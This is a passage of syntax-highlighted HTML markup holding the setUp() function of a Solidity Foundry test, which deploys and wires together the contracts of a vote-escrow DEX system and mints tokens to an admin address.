class=\"mtk7\"\u003e0xA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRoleFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDepositor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 